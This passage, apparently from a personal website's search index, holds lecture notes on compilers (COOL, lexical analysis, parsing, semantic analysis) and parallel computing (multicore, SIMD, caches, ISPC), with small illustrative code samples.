std::vector\u0026lt;int\u0026gt;, std::vector\u0026lt;double\u0026gt; Classes and inheritance: C++ derived classes C++ and Java have both Inheritance allows Specialization of existing abstractions Extension, modification, hidden behavior Trends # Language design Many new special-purpose languages Popular languages stick around (perhaps forever) Fortran and Cobol Compilers Ever more needed and more complex Driven by increasing gap between new languages and architectures Venerable and healthy area COOL overview # COOL: Classroom Object Oriented Language\nDesigned to be implentable in a short time Compiler will compile to MIPS assembly Features: Abstraction Static typing Reuse (inheritance) Memory management etc. Example # class Point { x: Int \u0026lt;- 0; y: Int \u0026lt;- 0; } Programs are sets of class definition Special class Main has special method main All COOL code lives inside classes Class: collection of attributes and methods Instances of a class are objects Objects # class Point { x: Int \u0026lt;- 0; y: Int; (* use default value *) } The expression new Point creates a new object of class Point An object can be thought of as a record with a slot for each attribute Methods # A class can also define methods for manipulating attributes Methods can refer to the current object using self class Point { x: Int \u0026lt;- 0; y: Int \u0026lt;- 0; movePoint(newx: Int, newy: Int): Point { { x \u0026lt;- newx; y \u0026lt;- newy; self; } -- close block expression }; -- close method }; -- close class Each object knows how to access the code of a method As if the object contains a slot pointing to the code Actual implementation: first slot of each object contains a pointer to a virtual table (vtable) which contains pointers to the methods Information hiding # Methods are global Attributes are local to a class They can only be accessed by the class methods Need getters/setters to access class attributes class Point { ... x () : Int { x }; setx (newx : Int) : Int { x \u0026lt;- newx }; }; Inheritance # Subclassing yields class hierarchy Implementation: Add new subclass fields as slots at the end of the objects Method table is copied and augmented for subclasses (no linking to method table of superclass) class ColorPoint inherits Point { color : Int \u0026lt;- 0; movePoint(newx : Int, newy : Int) : Point { color \u0026lt;- 0; x \u0026lt;- newx; y \u0026lt;- newy; self; }; }; Method invocation and inheritance # Methods are invoked by dispatch Understanding dispatch in the presence of inheritance is a subtle aspect of OO languages p : Point; -- p has static type Point p \u0026lt;- new ColorPoint; -- p has dynamic type ColorPoint p.movePoint(1, 2); -- p.movePoint must invoke the ColorPoint version e.g. invoke one-argument method m(x)\ne.m(e\u0026#39;) Evaluate expression e Find class of e Yields method table Find code of m Lookup in method table Evaluate argument e' Bind self and x for m Run method Types # Every class is a type Base classes: Int: integers, 4-byte type Bool: booleans - true, false String Object: root of class hierarchy All variables must be declared Compiler infers type for inheritance Type checking # x : A; x \u0026lt;- new B; Well-typed if A is an ancestor of B in the class hierarchy Anywhere an A is expected a B can be used Type safety: a well-typed program cannot result in runtime type errors Other expressions # Every expression has a type and a value Loops: while E loop E pool Conditionals: if E then E else E fi Case statement: case E of x : Type =\u0026gt; E; ... esac Arithmetic, logical operations Assignments: x \u0026lt;- E Primitive I/O: out_string(s), in_string(s) Missing features: Arrays Floating point operations Exceptions etc. Memory management # Memory is allocated every time new is invoked Memory is deallocated automatically when an object is no longe reachable Done by the garbage collector (GC) "},{"id":70,"href":"/notes/cs143/2022-04-05-lexical-analysis/","title":"Lexical Analysis","section":"CS 143, Spring 2022","content":" Lexical analysis # Goal: partition input strings into substrings; i.e.\nif (i == j) z = 0; else z = 1; converts to\n\u0026#34;if(i==j)\\n\\tz=0;\\n\\telse\\n\\tz=1\u0026#34; which we want to select the relevant tokens from.\nTokens # Tokens are a syntactic category\nIn English: noun, verb, adjective, etc. In programming languages: identifier, integer, keyword, whitespace, etc. A token class corresponds to a set of strings; e.g.\nIdentifier: strings of letters or digits, starting with a letter Integer: a non-empty string of digits Keyword: if, else, begin, etc. Whitespace: nonempty sequence of blanks, newlines, and tabs Tokens are used for classifying program substrings depending on their role\nLexical analysis produces a set of tokens, which is then used as input to the parser\nParser relies on token distinctions: e.g. an identifier is treated differently than a keyword Designing a lexical analyzer (lexer) # Step 1: define a finite set of tokens # Tokens define all items of interest Identifiers, integers, keywords, etc. Choice of tokens depends on language and design of parser e.g.\n\u0026#34;if(i==j)\\n\\tz=0;\\n\\telse\\n\\tz=1\u0026#34; Useful tokens include Integer, keyword, relation, identifier, whitespace, (, ), =, ; Step 2: describe which strings belong to each token # Identifier: strings of letters or digits, starting with a letter Integer: a non-empty string of digits Keyword: if, else, begin, etc. Whitespace: nonempty sequence of blanks, newlines, and tabs Implementation # Classify each substring as a token Return the value or lexeme of a token Lexeme is the actual substring From the set of substrings that make up the token Note: lexer returns token-lexeme pairs, plus line numbers, file names, etc. to improve later error messages\ne.g.\n\u0026#34;if(i==j)\\n\\tz=0;\\n\\telse\\n\\tz=1\u0026#34; yields token-lexeme pairs\n{ \u0026#39;whitespace\u0026#39;: [ \u0026#39;\\t\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;\\n\u0026#39;, ], \u0026#39;keyword\u0026#39;: [ \u0026#39;if\u0026#39;, \u0026#39;else\u0026#39; ], \u0026#39;identifier\u0026#39;: [ \u0026#39;i\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;z\u0026#39; ], \u0026#39;integer\u0026#39;: [ \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39; ], \u0026#39;(\u0026#39;: \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;: \u0026#39;)\u0026#39;, ... } Lexer usually discards \u0026ldquo;uninteresting\u0026rdquo; tokens that don\u0026rsquo;t contribute to parsing: e.g. whitespace, comments\nWhat not to do: \u0026ldquo;crimes\u0026rdquo; of lexical analysis # e.g. FORTRAN: whitespace is insignificant (motivated by inaccuracy of punch card operators) VAR1 is the same as VA R1 Lookahead: may be required to decide where one token ends and the next token begins Even our simple example has lookahead issues: i vs if, = vs == PL/I: keywords are not reserved IF ELSE THEN THEN = ELSE; ELSE ELSE = THEN is valid! DECLARE(ARG1, ..., ARGN): cannot tell whether DECLARE is a keyword or array reference until after the ) - requires arbitrary lookahead C++: template syntax (until C++11) Template: Foo\u0026lt;Bar\u0026gt; Stream: cin \u0026gt;\u0026gt; var Nested templates: Foo\u0026lt;Bar\u0026lt;Baz\u0026gt;\u0026gt;: unclear what the \u0026gt;\u0026gt; is, so before C++11 we needed to write this as Foo\u0026lt;Bar\u0026lt;Baz\u0026gt; \u0026gt; Regular languages # Many formalisms for specifiying tokens; regular languages are the most popular Simple and useful theory Easy to understand Efficient implementations Def. Let alphabet Σ be set of characters; a language L over Σ is a set of strings of characters drawn from Σ Alphabet = English characters; Language = English sentences Alphabet = ASCII; language = C programs Observe that not every string of English characters is an English sentence Notation: Languages are sets of strings Need some notation for specifying which sets we want The standard notation for regular languages is regular expressions Regular expressions # Atomic regular expressions: basic rules\nSingle character 'c' = {'c'} Epsilon ε = {''} Compound regular expressions\nUnion A + B = {s | s ∈ A or s ∈ B} Concatenation AB = {ab | a ∈ A and b ∈ B} Iteration (Kleene star) A* = U_{i \u0026gt;= 0} A^i where A^i = A repeated i times Def. regular expressions: the regular expressions over Σ are the smallest set of expressions including the above operators\nDescribing tokens as regular expressions # Keywords: else, if, begin, etc. keyword = \u0026quot;else\u0026quot; + \u0026quot;if\u0026quot; + \u0026quot;begin\u0026quot; + ... Integers: non-empty sets of digits digit = '0' + '1' + '2' + '3' + '4' + '5' + '6' + '7' + '8' + '9' integer = digit digit* = digit+ Identifiers: strings of letters or digits, starting with a letter letter = 'A' + ... + 'Z' + 'a' + ... + 'z' identifier = letter (letter + digit)* Whitespace: non-empty sequence of blanks, newlines, and tabs ('' + '\\n' + '\\t')+ "},{"id":71,"href":"/notes/cs143/2022-04-07-lexical-analysis-implementation/","title":"Lexical Analysis Implementation","section":"CS 143, Spring 2022","content":" Implementation of Lexical Analysis # Stages of code processing in lexical analysis:\nLexical Specification Regular Expressions NFA DFA Table-driven implementation of DFA Converting a lexical specification to a regular expression # Notation # Union: A + B = A | B Option: A + ε = A? Range: \u0026lsquo;a\u0026rsquo; + \u0026lsquo;b\u0026rsquo; + \u0026hellip; + \u0026lsquo;z\u0026rsquo; = [a-z] Excluded range: complement of [a-z] = ^[a-z] Steps # Write a regex for each token Number = digit + Keyword = 'if' + 'else' + ... Identifier = letter(letter+digit)* OpenParenthesis = '(' \u0026hellip; Construct R, matching all lexemes for all tokens R = Keyword + Number + Identifier + Number + \u0026hellip; This step is usually done automatically by tools like Flex Check contiguous subsets of tokens are in L(R) Let input be x1\u0026hellip;xn For 1 \u0026lt;= i \u0026lt;= n check that x1\u0026hellip;xi is in L(R) Removing tokens If success then we know that x1\u0026hellip;xi is in L(Rj) for some j Remove x1\u0026hellip;xi from the input and goto step 3 Ambiguities # How much input is being used? What if x1\u0026hellip;xi is in L(R) but so is x1\u0026hellip;xk? Rule: pick longest possible string in L(R); pick k if k \u0026gt; i Which token is used? What if x1\u0026hellip;xi is in L(Rj) and also in L(Rk)? Rule: use rule listed first; pick j if j \u0026lt; k This treats if as a keyword, not as an identifier Error handling # What if no rule matches a prefix of the input? Solution: write a rule matching all \u0026ldquo;bad\u0026rdquo; strings Put it last (lowest priority) Rule accepts any single character of the alphabet Finite automata # See my notes from CS154.\nDFA implementation as tables # A DFA can be implemented by a 2D table T One dimension is \u0026ldquo;states\u0026rdquo; Another dimension is \u0026ldquo;input symbol\u0026rdquo; For every transition Si -\u0026gt;a Sk define T[i, a] = k DFA execution If in state Si and input a, read T[i, a] = k and skip to state Sk Very efficient "},{"id":72,"href":"/notes/cs143/2022-04-12-parsing/","title":"Parsing","section":"CS 143, Spring 2022","content":" Parsing # Parser functionality # Input: sequence of tokens from lexer Output: parse tree of the program (in practice, Abstract Syntax Tree) Parser distinguishes between valid and invalid strings of tokens Requires a language for describing valid strings of tokens Requires a method for distinguishing between valid and invalid strings of tokens e.g.\nCOOL syntax: if x = y then 1 else 2 fi Parser input (Lexer output): IF ID = ID THEN INT ELSE INT FI Parser output: Context-Free Grammars # Disadvantages of regular languages:\nMany languages (i.e., balanced parenthesis) are nonregular yet we want to be able to capture them A finite automaton that runs long enough must repeat states, but finite automata can\u0026rsquo;t remember the number of times it visited a state A CFG is a natural notation for recursive structure found in programming language constructs\ne.g. an EXPR can be if EXPR then EXPR else EXPR fi while EXPR loop EXPR pool A CFG consists of A set of terminals T A set of non-terminals N A start symbol S (a non-terminal) A set of productions X -\u0026gt; Y1Y2\u0026hellip;Yn, where X in N Yi in T ∪ N ∪ {ε} COOL example: EXPR -\u0026gt; if EXPR then EXPR else EXPR fi | while EXPR then EXPR pool | id Implementation: Bison CFG languages # Read productions as rules: X -\u0026gt; Y1Y2\u0026hellip;Yn means X can be replaced by Y1Y2\u0026hellip;Yn Key idea: Begin with a string consisting of the start symbol S Replace non-terminals $X$ in the string by the right-hand side of some production X -\u0026gt; Y1Y2\u0026hellip;Yn Repeat (2) until there are no non-terminals left in the string Formally: Let $G$ be a CFG with start symbol $S$. Then the language of $G$ is {a1\u0026hellip;an | S -\u0026gt;* a1\u0026hellip;an and every ai is a terminal} Terminals are so-called because there are no rules for replacing them: once generated, they are permanent Terminals should be tokens of the language Example: strings of balanced parantheses S -\u0026gt; (S), S -\u0026gt; ε Example: arithmetic expressions E -\u0026gt; E+E | E*E | (E) | id Derivations and parse trees # A derivation is a sequence of productions leading to a string of only terminals: s -\u0026gt; \u0026hellip; d -\u0026gt; \u0026hellip; A derivation can be drawn as a tree Start symbol is a tree\u0026rsquo;s root For a production X -\u0026gt; Y1Y2\u0026hellip;Yn add children X -\u0026gt; Y1Y2\u0026hellip;Yn to node X Example: Notes: A parse tree has terminals at the leaves, non-terminals at the inner nodes An in-order traversal of the leaves is the original inputs The parse tree shows the association of operations, the input string does not Can do derivations in left-most order (replace left-most non-terminal at each step) or right-most order; these yield equivalent parse trees Ambiguity # A CFG is ambiguous if it has more than one parse tree for some string Leaves meaning of some programs ill-defined Example: Grammar E -\u0026gt; E+E | E*E | (E) | id String id * id + id Yields following parse trees: To deal with ambiguity, most direct method is to rewrite grammar unambiguously E -\u0026gt; E\u0026rsquo; + E | E' E -\u0026gt; id * E\u0026rsquo; | id | (E) * E\u0026rsquo; | (E) Enforces precedence of multiplication over addition Tools now can allow precedence and associativity declarations to allow one to write natural ambiguous grammar and then disambiguate later "},{"id":73,"href":"/notes/cs143/2022-04-14-syntax-directed-translation/","title":"Syntax Directed Translation","section":"CS 143, Spring 2022","content":" Error handling # Purpose of the compiler is to detect non-valid programs and to translate the valid ones Many kinds of possible errors: Lexical (detected by lexer) Syntax (detected by parser) Semantic (detected by type checker) Correctness (detected by tester/user) Syntax error handling # Error handler should Report errors accurately and clearly Recover from an error quickly Not slow down compilation of valid code Good error handling is not easy to achieve Panic Mode # Simplest, most popular method of error detection When an error is detected: Discard tokens until one with a clear role is found Continue from there These tokens are called synchronizing tokens Usually statement or expression terminators e.g. expression (1 + + 2) + 3 Recovery involves skipping to the next integer after the second + and then continuing Bison: use special skip terminator error to describe how much input to skip E -\u0026gt; int | E + E | ( E ) | error int | ( error ) Error productions # Idea: specify in grammar known common mistakes Promotes common errors to alternative syntax to show more useful errors e.g. write 5 x instead of 5 * x Add production E -\u0026gt; ... | E E Disadvantage: complicates grammar Local and global correction # Idea: find correct \u0026ldquo;nearby\u0026rdquo; program Try token insertions and deletions Exhaustive search Disadvantages: Hard to implement Slows down parsing of correct programs Nearby is not necessarily the \u0026ldquo;intended\u0026rdquo; program Not all tools support it Past vs. present # In the past, recompilation was slow (even once a day) Wanted to find as many errors as possible in one cycle Active area of research In the present, recompilation cycle is very quick (users tend to correct only a few errors per cycle) Don\u0026rsquo;t necessarily need complex error recovery, panic mode may be enough Abstract Syntax Trees # So far: parser traces derivation of token sequences Rest of the compiler needs a structural representation of the program Abstract syntax trees (ASTs): like parse trees but ignore some details For the following: consider the example\nGrammar: E -\u0026gt; int | (E) | E + E String: 5 + (2 + 3) After lexing: INT_5 PLUS LPAREN INT_2 PLUS 3 RPAREN Parse tree vs. AST # Example parse tree:\nThis does trace parser operation and capture nesting structure, but has a lot of additional details Parenthesis Single-successor nodes Example AST:\nCaptures what we want to, but much less unnecessary detail Semantic actions extension to CFGs # Will use to construct ASTs Can be used to build many other thing: type checking, code generation, computation, etc. Process is called syntax-directed translation: substantial generalization over CFGs Each grammar symbol can have attributes For terminals, attributes can be calculated by lexer Each production can have an action Written as X -\u0026gt; Y_1 ... Y_n { action } Can refer to or compute symbol attributes Specifies a system of equations Declarative style: order of resolution is not specified and figured out by parser Imperative style: order of resolution is fixed; important if actions modify global state Bison has fixed order of evaluation for actions - values will depend on others Types of attributes: Synthesized attributes: calculated from attributes of descendants in parse tree e.g. E.val Can be calculated in bottom-up order Most common case: grammars with only synthesized attributes - called S-attributed grammars Inherited attributes: calculated from attributes of parent and/or siblings in parse tree Example with above grammar: For each symbol X define attribute X.val For terminals, val is associated lexeme For nonterminals, val is the expression\u0026rsquo;s value (and is computed from values of subexpressions) Annotate grammar with actions E -\u0026gt; int { E.val = int.val } | E1 + E2 { E.val = E1.val + E2.val } | (E1) { E.val = E1.val } For example string: processes into Dependency graphs # Example:\nAttributes must be computed after all successors have been computed Orders exist only when there are no cycles Line calculator # Each line contains an expression E -\u0026gt; int | E + E Each line is terminated with the = sign L -\u0026gt; E = | + E = Program is a sequence of lines P -\u0026gt; ε | P L Attributes: Each E has a synthesized attribute val, calculated as before Each L has an attribute val L -\u0026gt; E= { L.val = E.val } | +E= { L.val = E.val + L.prev } Need value of previous line Use inherited attribute L.prev Each program P has synthesized attribute val equal to value of last line P -\u0026gt; ε { P.val = 0 } | P1L { L.prev = P1.val; P.val = L.val } Each L has inherited attribute prev L.prev inherited from sibling P1.val Constructing an AST # First: define AST data type Abstract tree type has two constructors in our example: mkleaf(n) (creates leaf node) mkplus(T1, T2) (creates PLUS node with two descendants T1 and T2) Define synthesized attribute ast Values of ast values are ASTs Assume int.lexval is value of integer lexeme Computed using semantic actions E -\u0026gt; int E.ast = mkleaf(int.lexval) | E1 + E2 E.ast = mkplus(E1.ast, E2.ast) | (E1) E.ast = E1.ast For our example: E.ast = mkplus( mkleaf(5), mkplus( mkleaf(2), mkleaf(3) ) ) "},{"id":74,"href":"/notes/cs143/2022-04-19-top-down-parsing/","title":"Top Down Parsing","section":"CS 143, Spring 2022","content":" Top-down parsing # Predictive parsers # Like recursive-descent, but parser can \u0026ldquo;predict\u0026rdquo; which production to use by looking at next few tokens (no backtracking) Predictive parsers accept LL(k) grammars First L: \u0026ldquo;left-to-right\u0026rdquo; input scan Second L: \u0026ldquo;leftmost derivation\u0026rdquo; k: \u0026ldquo;predict based on k tokens of lookahead\u0026rdquo; In practice: LL(1) LL(1) vs Recursive Descent # Recursive Descent: at each step, many choices of production to use Backtracking used to undo bad choices LL(1): at each step, only one choice of production When non-terminal A is leftmost in a derivation and next input t, either: Unique production A -\u0026gt; α to use No production to use (error state) Like a recursive descent variant but without backtracking Predictive parsing and left factoring # Example: consider grammar E -\u0026gt; T + E | T T -\u0026gt; int | int * T | ( E ) This is hard to predict because For T two productions start with int For E unclear how to predict Requires left-factoring the grammar Factor out common prefixes of productions: E -\u0026gt; T X X -\u0026gt; + E | ε T -\u0026gt; int Y | ( E ) Y -\u0026gt; * T | ε "},{"id":75,"href":"/notes/cs143/2022-04-26-semantic-analysis/","title":"Semantic Analysis","section":"CS 143, Spring 2022","content":" Semantic Analysis # Purpose of semantic analysis # Why separate semantic analysis?\nParsing cannot catch some errors Some language constructs are not context-free What does semantic analysis do? Checks constructs depending on language\ncoolc checks:\nAll identifiers are declared Types Inheritance relationships Classes defined only once Class methods only defined once Reserved identifiers are not misused etc. Types of semantic analysis checks # Scope # Matching identifier declarations with uses Important static analysis step in most languages, including COOL The scope of an identifier is the portion of a program in which that identifier is accessible Same identifier may refer to different things in different parts of the program An identifier may have restricted scope Static scope: depends only on program text, not run-time behavior (most languages, including COOL) Uses of an identifier refer to closest enclosing definition in program text Dynamic scope: depends on program execution (LISP, SNOBOL) Uses of an identifier refer to closest encloding binding in program execution In COOL: Not all kinds of identifiers follow most-closely-nested rule e.g. class names can be used before definition Class Foo { ...let y: Bar in... }; Class Bar { ... }; Implementing the most-closely-nested rule Much of semantic analysis can be expressed as a recursive descent of AST Before: process an AST node n Recurse: process the children of n After: finish processing the AST node n When performing semantic analysis on a portion of the AST, we need to know which identifiers are defined e.g. scope of let bindings is one subtree of the AST: let x: Int \u0026lt;- 0 in e x is defined in subtree e Before processing e, add definition of x to current definitions, overriding any definition of x Recurse After processing e, remove definition of x and restore old definition of x Symbol table: data structure that tracks current binding of identifiers Implemented using stack Types # What is a type? Consensus is A set of values A set of operations on those values Classes are one instantiation of the modern notion of type A language\u0026rsquo;s type system specifies which operations are valid for which types e.g. Should not be adding function pointer and integer in C Enforces intended interpretation of values Types of typing: Static typing: all or almost checking of types is done as part of compilation (e.g. C, Java, COOL) Advantages: catch many programming errors at compile tyme, avoids overhead of runtime type checks Dynamic typing: almost all checking of types is done at runtime (Scheme, Python) Advantages: makes rapid prototyping difficult Untyped: machine code Type Checking # Cool types # Types: Class names SELF_TYPE User declares types for identifiers Compiler infers types for expressions Infers a type for every expression Type checking and type inference # Type checking: process of verifying fully typed programs Type inference: process of filling in missing type information "},{"id":76,"href":"/notes/cs149/2022-09-27-intro/","title":"Intro","section":"CS 149, Fall 2022","content":" Parallel Computing # Course themes # Designing parallel programs that scale # Parallel thinking Decomposing work into pieces that can safely be performed in parallel Assigning work to processors Managing communication/synchronization between the processors to not limit speedup Parallel computer hardware implementation # How do parallel computers work? Mechanisms used to implement different abstractions efficiently Performance characteristics of implementations Design tradeoffs: performance vs. convenience vs. cost Why know about hardware? Characteristics of machine matter! We care about efficiency and performance Thinking about efficiency # Fast != efficient! Just because program runs faster on a parallel computer, it does not mean it is using hardware efficiently Is 2x speedup on a computer with 10 processors a good result? Hardware designer\u0026rsquo;s perspective: choosing the right capabilities to put in a processor Performance/cost Metric for cost: silicon area, power, etc Course logistics # Grading # 56%: programming assignments (4) 10%: written assignments (5) 16%: midterm exam (evening of Nov. 15) 16%: final exam (Thu, Dec. 15, 3:30pm) 2%: asynchronous participation (website comments) Why parallelism? # Defining programs and processors # Program: a list of processor instructions e.g. write it in C, \u0026lt;compile\u0026gt;, results in assembly that maps to machine code for a certain instruction set What does a processor do? Fetch/decode: determine what instruction to run next Execution unit: performs operation described by instruction, which may modify values in processor registers or computer memory Registers: maintain program state, store value of variables used as inputs and outputs to operation e.g. add two numbers Figure out next program instruction from memory e.g. add r0 \u0026lt;- r0, r1 Get operation inputs from registers e.g. r0 = 32, r1 = 64 Perform addition operation e.g. execution unit performs arithmetic, result is 96 Key terminology:\nComputer program: list of instructions to execute Instruction: describes operation for processor to perform; typically modifies program state Program state: values of program data, stored in registers and memory Instruction-level parallelism (ILP) # If certain instructions in a certain sequence are independent, it is possible to parallelize them without affecting program order e.g. // this does a = x*x + y*y + z*z mul r0, r0, r0 // 1: parallel mul r1, r1, r1 // 2: parallel mul r2, r2, r2 // 3: parallel add r0, r0, r1 // 4: sequential post-1 and 2 add r3, r0, r2 // 5: sequential post-3 and 4 Superscalar processor execution Idea: processor automatically finds independent instructions in an execution environment and executes them in parallel on multiple execution units Or: compiler finds such instructions and encodes such dependencies in the binary Issue: diminishing returns Most available ILP is exploited by a processor capable of issuing four instructions per clock; little benefit from building a processor with more Historically: avoiding parallel processing # Single-threaded CPU performance doubled every ~18 months (Moore\u0026rsquo;s Law) Implication: working to parallelize code was often not worth the time Do no work, wait 18 months, speed doubles! This was because of: Instruction-level parallelism scaling Frequency scaling: increase in CPU processing frequency (GHz) However: ILP scaling hit dimishing returns Frequency scaling limited by power and heat: cannot effectively cool much more than a few hundred watts in a standard desktop computer Intel i9-10900K (2020): 95W Nvidia RTX 3080 (2020): 320W Therefore: shift to \u0026ldquo;replicating processors\u0026rdquo;: parallelism! - 32-40x performance increase\n"},{"id":77,"href":"/notes/cs149/2022-09-29-modern-multicore-processors/","title":"Modern Multicore Processors","section":"CS 149, Fall 2022","content":" A Modern Multi-core Processor # Part 1: Speeding up an example sine program # Computes sin across an array of float values using a Taylor series expansion\nvoid sinx(int N, int terms, float *x, float *y) { for (int i = 0; i \u0026lt; N; i++) { float value = x[i]; float numer = x[i] * x[i] * x[i]; int denom = 6; // 3! int sign = -1; for (int j = 1; j \u0026lt;= terms; j++) { value += sign * numer / denom; numer *= x[i] * x[i]; denom *= (2 * j + 2) * (2 * j + 3); sign *= -1; } y[i] = value; } } This compiles to some assembly:\nld r0, addr[r1] // x[i] mul r1, r0, r0 mul r1, r1, r0 // ... st addr[r2], r0 // y[i] Pre-multicore era processor # Majority of chip transistors used to perform ops that help make single instruction streams run fast Out of order control logic Fancy branch predictor Memory prefetcher More transistors = larger cache Multicore-era processor # Idea: use transistor count to add more cores to the processor Simple cores: each core maybe slowre at running a single instruction stream than original fancy core (e.g. 25% slower) However, with two cores: 2 * 0.75 = 1.5 = 50% speedup! However: C program will compile to single instruction stream that runs on only one thread on one core Transforming a program to multicore # typedef struct { int N, int terms; float *x; float *y; } my_args; void my_thread_func(my_args *args) { sinx(args-\u0026gt;N, args-\u0026gt;terms, args-\u0026gt;x, args-\u0026gt;y); // do work } void parallel_sinx(int N, int terms, float *x, float *y) { std::thread my_thread; my_args args; args.N = N/2; args.terms = terms; args.x = x; args.y = y; my_thread = std::thread(my_thread_func, \u0026amp;args); // launch thread sinx(N - args.N, terms, x + args.N, y + args.N); // do work on main thread /* NOTE: because of this waiting, we can only ever get 2x speedup!! */ my_thread.join(); // wait for thread to complete } Data-parallel expressions # void sinx(int N, int terms, float *x, float *y) { // original: // for (int i = 0; i \u0026lt; N; i++) { // new: fictituous forall construct that tells the compiler // that each of these iterations are independent forall (int i from 0 to N) { float value = x[i]; float numer = x[i] * x[i] * x[i]; int denom = 6; // 3! int sign = -1; for (int j = 1; j \u0026lt;= terms; j++) { value += sign * numer / denom; numer *= x[i] * x[i]; denom *= (2 * j + 2) * (2 * j + 3); sign *= -1; } y[i] = value; } } With such a construct, a compiler might be able to autogenerate threaded code.\nSIMD processing # Single instruction, multiple data Additional execution units (ALUs) increase compute capability Idea: Amortize cost/complexity of managing an instruction stream across many ALUs Same instruction broadcast to all ALUs Operation executed in parallel on all ALUs e.g. Original scalar program processes one array element using scalar instructions on scalar registers Instead, use vector operations (i.e. __m256 types and __mm256 arith and load operations) These are intrinsic datatypes and functions available to C programmers These operate on vectors of eight 32-bit values (e.g. vector of 8 floats) Compiled program processes eight array elements simultaneously using vector instructions on 256-bit vector register Note: with Data-parallel expression example code, the forall abstraction can also facilitate autogeneration of SIMD instructions In addition to multi-core parallel code! Conditional execution with SIMD # Consider the following example\nforall (int i from 0 to N) { float t = x[i]; // unconditional code if (t \u0026gt; 0.0) { t = t * t; t = t * 50.0; t = t + 100.0; } else { t = t + 30.0; t = t / 10.0; } // resume unconditional code y[i] = t; } How to process this on a vector-only CPU? Mask (discard) output of ALU Run all with true branches, discard output of false branches Run all with false branches, discard output of true branches Worst case: 1/8 of peak performance Can create this by making the if branch extremely costly, but processor is still forced to send all the branch that way if (i == 0) { do_something_super_costly(); } else { do_something_normal(); } SIMD jargon # Instruction stream coherence (\u0026ldquo;coherent execution\u0026rdquo;) Property of a program where same instruction stream applies to many data elements NECESSARY for SIMD processing to be used efficiently NOT NECESSARY for efficient parallelization across different cores Divergent execution Lack of instruction stream coherence Modern CPU examples of SIMD # AVX2 (Intel): 256b operations: 8x32bit or 4x64bit AVX512 (Intel): 512b: 16x32bit ARM Neon: 128b: 4x32bit Instructions generated by complier Requested by programmer using intrinsics Or parallel language semantics (e.g. forall) Inferred by dependency analysis of loops by auto-vectorizing compiler Explicit SIMD: SIMD parallelization performed at compile time SIMD instructions in binary itself (e.g., vstoreps, vmulps, etc.) Example: Intel i7-7700K (Kaby Lake, 2017) # 4 core CPU Three 8-wide SIMD ALUs per core for AVX2 4 cores x 8-wide SIMD * 3 * 4.2 GHz = 400 GFLOPs SIMD on GPUs # \u0026ldquo;Implicit SIMD\u0026rdquo; Compiler generates binary with scalar instructions But N instances of program always run together on processor Hardware, not compiler, responsible for executing same instruction on multiple program instances on different data on SIMD ALUs SIMD width of most modern GPUs ranges from 8 to 32 Divergent execution can result in 1/32 of peak capacity Part 2: accessing memory # Load/store: instructions that access memory # // load 4b value in memory starting from address stored by register r2 // and put it into register r0 ld r0 mem[r2] // store 4b value in r0 into address stored by register r2 st r0 mem[r2] Memory terminology # Memory address space Memory organized as sequence of bytes Each byte identified by address in memory Address space: total addressable memory of a program Memory access latency Amount of time it takes memory system to provide data to the processor e.g. 100 clock cycles, 100 nsec Stalls A processor \u0026ldquo;stalls\u0026rdquo; when it cannot run the next instruction in an instruction stream due to dependency on a previous incomplete instruction e.g. Accessing memory can cause stalls ld r0 mem[r2] ld r1 mem[r3] // Dependency: cannot execute `add` instruction until data // from mem[r2] and mem[r3] have been loaded from memory add r0, r0, r1 Memory access times: ~hundreds of cycles Measure of latency Caches # On-chip storage that maintains copy of subset of values in memory Address is \u0026ldquo;in the cache\u0026rdquo;: processor can load and store address more quickly than if data resided in memory Hardware implementation detail that does not impact program output; only performance For this class, abstraction: assume cache of size N keeps last N addresses accessed \u0026ldquo;LIFO\u0026rdquo; policy: on each memory access, throw out oldest data in cache to make room for newly accessed data In real world, other policies: Direct mapped cache Set-associative cache Cache line Reduce length of stalls and memory access latency Specifically: when accessing data that had recently been accessed e.g. Data access times, Intel Kaby Lake (2017) L1 cache: 4 cycles L2 cache: 12 cycles L3 cache: 38 cycles DRAM: best case ~248 cycles Data prefetching # Logic on modern CPUs for guessing what data will be accessed in the future Prefetch this data into caches Dynamically analyze program memory access patterns to make predictions Reduces stalls since data is already resident in cache when accessed However: can reduce perf. if guess is wrong (consumes bandwidth, pollutes caches) Multithreading to reduce stalls # Interleave processing of multiple threads on same core to hide stalls Can\u0026rsquo;t make process on one thread? Work on another one Once hitting a stall on one thread, immediately switch over another one Idea: potentially increase time to complete a single thread\u0026rsquo;s work in order to increase overall system throuput when running multiple threads However: this requires storing execution contexts Tradeoff between memory caching and storing these execution contexts Takeaway: a processor with multiple HW threads has the ability to avoid stalls by interleaving executions This doesn\u0026rsquo;t affect mem. access latency; it just improves processor utilization Hardware-supported multithreading # Core manages execution contexts for multiple threads Interleaved multi-threading Simultaneous multi-threading (SMT) e.g. Intel Hyper-Threading Broader takeaway: can combine each of these parallelism constructs!\nThis is what modern chips (e.g., Intel Skylake/Kaby Lake, Nvidia GPUs) do Latency and Bandwidth # Memory bandwidth: rate at which memory system can provide data to a processor (e.g., 20 GB/s) Execution speed is often limited by available bandwidth e.g. data transfer speed = 8 bytes per clock: then simple math adds (1 add per clock) can create up to 3 outstanding load requests This is called bandwidth-bound execution: instruction throughput limited by bandwidth, not latency or outstanding requests etc. Influences chip design: modern GPUs place memory on or near chip "},{"id":78,"href":"/notes/cs149/2022-10-04-parallel-abstractions/","title":"Parallel Abstractions","section":"CS 149, Fall 2022","content":" Parallel Abstractions and Implementation # ISPC # Intel SPMD (single program, multiple dat) Program Compiler: https://ispc.github.io e.g. sinx using ISPC\nexport void ispc_sinx( // uniform: type modifier for optimization, not necessary for correctness uniform int N, uniform int terms, uniform float *x, uniform float *result ) { // programCount: keyword, number of simultaneously executing gang instances for (uniform int i = 0; i \u0026lt; N; i += programCount) { // programIndex: id of current gang instance int idx = i + programIndex; float value = x[idx]; float numer = x[idx] * x[idx] * x[idx]; uniform int denom = 6; uniform int sign = -1; for (uniform int j = 1; j \u0026lt;= terms; j++) { value += sign * numer / denom; numer *= x[idx] * x[idx]; denom *= (2*j+2) * (2*j + 3); sign *= -1; } result[idx] = value; } } int main (int argc, char **argv) { // initializations ispc_sinx(N, terms, x, result); return 0; } ISPC execution Call to ISPC function spawns \u0026ldquo;gang\u0026rdquo; of ISPC \u0026ldquo;program instances\u0026rdquo; All instances run ISPC code concurrently Each instance has its own copy of local variables Upon return, all instances have completed What ISPC does Turns instructions into SIMD at compilation time Number of instances in a gang: SIMD width of the hardware (or small multiple thereof) Does not spawn new threads! 